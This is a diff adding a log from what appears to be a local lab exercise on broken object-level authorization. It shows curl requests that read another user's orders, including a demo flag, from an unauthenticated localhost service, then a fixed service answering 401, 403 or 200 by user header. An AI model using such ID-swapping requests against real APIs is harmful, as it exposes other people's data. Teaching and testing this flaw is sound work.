@@ -1,0 +1,19 @@
+=== TASK 1 — BOLA (insecure :8080, no auth) ===
+$ curl -s http://localhost:8080/api/users/3/orders
+[{"item":"Server rack","order_id":"C-1","total":5000},{"item":"FLAG{bola_demo}","order_id":"C-FLAG","total":0}]
+
+[HTTP 200]
+$ curl -s http://localhost:8080/api/users/2/orders
+[{"item":"Mouse","order_id":"B-1","total":15}]
+
+[HTTP 200]
+
+=== TASK 1 — secure :8081 ladder ===
+$ curl -s -i http://localhost:8081/api/users/3/orders   # no identity
+HTTP/1.1 401 UNAUTHORIZED
+$ curl -s -i -H "X-User-Id: 1" http://localhost:8081/api/users/3/orders   # alice -> carol
+HTTP/1.1 403 FORBIDDEN
+$ curl -s -i -H "X-User-Id: 1" http://localhost:8081/api/users/1/orders   # alice -> alice
+HTTP/1.1 200 OK
+$ curl -s -i -H "X-User-Id: 3" http://localhost:8081/api/users/1/orders   # carol(admin) -> alice
+HTTP/1.1 200 OK
